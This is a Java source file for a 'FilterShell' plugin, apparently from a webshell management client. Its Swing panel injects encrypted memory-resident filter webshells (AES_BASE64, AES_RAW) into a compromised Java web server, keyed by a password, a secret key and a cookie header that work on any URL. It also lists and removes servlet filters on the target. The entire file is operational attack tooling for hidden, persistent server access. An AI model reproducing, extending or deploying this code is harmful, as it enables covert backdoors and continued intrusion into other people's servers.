package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "FilterShell", DisplayName = "FilterShell")
public class FilterShell
  implements Plugin
{
  private static final String[] MEMORYSHELS = new String[] { "AES_BASE64", "AES_RAW" };
  
  private static final String CLASS_NAME = "plugin.FilterManage";
  
  private final JPanel panel;
  
  private final JLabel filterShellPassLabel;
  
  private final JLabel filterShellSecretKeyLabel;
  
  private final JLabel filterShellCkLabel;
  
  private final JLabel filterShellPayloadLabel;
  
  private final JTextField filterShellPassTextField;
  
  private final JTextField filterShellSecretKeyTextField;
  
  private final JTextField filterShellCkTextField;
  private final JComboBox<String> payloadComboBox;
  private final JButton addFilterShellButton;
  private final JButton getAllFilterButton;
  private final JButton removeFilterButton;
  private final JSplitPane splitPane;
  private final RTextArea resultTextArea;
  private boolean loadState;
  private ShellEntity shellEntity;
  private Payload payload;
  private Encoding encoding;
  
  public FilterShell() {
    this.panel = new JPanel(new BorderLayout());

    
    this.filterShellPassLabel = new JLabel("password : ");
    this.filterShellCkLabel = new JLabel("Cookie : ");
    this.filterShellSecretKeyLabel = new JLabel("secretKey : ");
    this.filterShellPayloadLabel = new JLabel("payload : ");
    
    this.filterShellCkTextField = new JTextField(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16), 18);
    this.filterShellPassTextField = new JTextField("pass", 15);
    this.filterShellSecretKeyTextField = new JTextField("key", 15);
    this.payloadComboBox = new JComboBox<>(MEMORYSHELS);
    
    this.addFilterShellButton = new JButton("addFilterShell");
    this.getAllFilterButton = new JButton("getAlllFilter");
    this.removeFilterButton = new JButton("removeFilter");
    
    this.resultTextArea = new RTextArea();
    this.splitPane = new JSplitPane();
    
    this.splitPane.setOrientation(0);
    this.splitPane.setDividerSize(0);
    
    JPanel topPanel = new JPanel();
    
    topPanel.add(this.filterShellPassLabel);
    topPanel.add(this.filterShellPassTextField);
    topPanel.add(this.filterShellSecretKeyLabel);
    topPanel.add(this.filterShellSecretKeyTextField);
    topPanel.add(this.filterShellCkLabel);
    topPanel.add(this.filterShellCkTextField);
    topPanel.add(this.filterShellPayloadLabel);
    topPanel.add(this.payloadComboBox);
    topPanel.add(this.getAllFilterButton);
    topPanel.add(this.addFilterShellButton);
    topPanel.add(this.removeFilterButton);
    
    this.splitPane.setTopComponent(topPanel);
    this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
    
    this.splitPane.addComponentListener(new ComponentAdapter()
        {
          public void componentResized(ComponentEvent e) {
            FilterShell.this.splitPane.setDividerLocation(0.15D);
          }
        });
    
    this.panel.add(this.splitPane);
  }


  
  private void loadFilterManage() {
    if (!this.loadState) {
      try {
        InputStream inputStream = getClass().getResourceAsStream("assets/FilterManage.classs");
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        if (this.payload.include("plugin.FilterManage", data)) {
          this.loadState = true;
          Log.log("Load success", new Object[0]);
        } else {
          Log.error("Load fail");
        }
      
      } catch (Exception e) {
        Log.error(e);
      } 
    }
  }
  
  private void addFilterShellButtonClick(ActionEvent actionEvent) {
    try {
      String secretKey = functions.md5(this.filterShellSecretKeyTextField.getText()).substring(0, 16);
      String ck = this.filterShellCkTextField.getText();
      String password = this.filterShellPassTextField.getText();
      if (secretKey.length() > 0 && ck.length() > 0 && password.length() > 0) {
        String shellName = (String)this.payloadComboBox.getSelectedItem();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("secretKey", secretKey);
        reqParameter.add("ck", ck);
        reqParameter.add("pwd", password);
        String className = String.format("f.%s", new Object[] { shellName });
        InputStream inputStream = getClass().getResourceAsStream(String.format("assets/F_%s.classs", new Object[] { shellName }));
        byte[] classByteArray = functions.readInputStream(inputStream);
        inputStream.close();
        boolean loaderState = this.payload.include(className, classByteArray);
        if (loaderState) {
          byte[] result = this.payload.evalFunc(className, "run", reqParameter);
          String resultString = this.encoding.Decoding(result);
          Log.log(resultString, new Object[0]);
          this.resultTextArea.setText(String.format("You can access it at any Url\nYou Header is Cookie: %s=%s;", new Object[] { ck, functions.md5(Long.toString(System.currentTimeMillis())).substring(5, 12) }));
          GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
          this.filterShellCkTextField.setText(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16));
        } else {
          GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
        } 
      } else {
        GOptionPane.showMessageDialog(this.panel, "password or secretKey or ck is Null", "提示", 2);
      } 
    } catch (Exception e) {
      Log.error(e);
      GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
    } 
  }
  private void getAllFilterButtonClick(ActionEvent actionEvent) {
    loadFilterManage();
    byte[] result = this.payload.evalFunc("plugin.FilterManage", "getAllFilter", new ReqParameter());
    this.resultTextArea.setText(this.encoding.Decoding(result));
  }
  
  private void removeFilterButtonClick(ActionEvent actionEvent) {
    loadFilterManage();
    String filterName = GOptionPane.showInputDialog("filterName");
    if (filterName != null && filterName.length() > 0) {
      ReqParameter reqParameter = new ReqParameter();
      reqParameter.add("filterName", filterName);
      byte[] result = this.payload.evalFunc("plugin.FilterManage", "unFilter", reqParameter);
      String resultString = this.encoding.Decoding(result);
      Log.log(resultString, new Object[0]);
      GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
    } 
  }

  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(this, this);
  }



  
  public JPanel getView() {
    return this.panel;
  }
}
